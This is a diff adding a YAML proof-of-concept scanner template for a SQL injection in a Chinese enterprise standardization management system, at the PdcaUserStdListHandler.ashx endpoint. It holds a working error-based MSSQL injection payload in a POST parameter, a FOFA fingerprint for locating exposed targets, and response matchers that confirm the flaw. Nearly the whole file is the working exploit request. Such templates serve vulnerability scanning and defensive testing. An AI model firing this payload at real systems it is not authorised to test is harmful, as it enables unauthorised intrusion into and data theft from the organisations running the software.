@@ -1,0 +1,20 @@
+id: poc-yaml-run-shen-information-esms-pdcauserstdlisthandler-ashx-sqli
+info:
+  name: 润申信息企业标准化管理系统 PdcaUserStdListHandler.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业标准化管理系统
+  fofa: body="企业标准化管理系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /PDCA/ashx/PdcaUserStdListHandler.ashx?action=GetDataBy
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: code=1&lablecode=-9458%29+OR+5511+IN+%28SELECT+%28sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%2B%28SELECT+%28CASE+WHEN+%285511%3D5511%29+THEN+CHAR%2832%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%2832%29%29%29--+XeuQ&LableName=&page=1&rows=20
+  expression: "status_code == 500 && \ncontains(body,\"0x\" + t2) &&\ncontains(body,\"\
+    &nbsp\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\") &&\nmatches(body,\"在将(.*?)值\")\n"
+transport: http
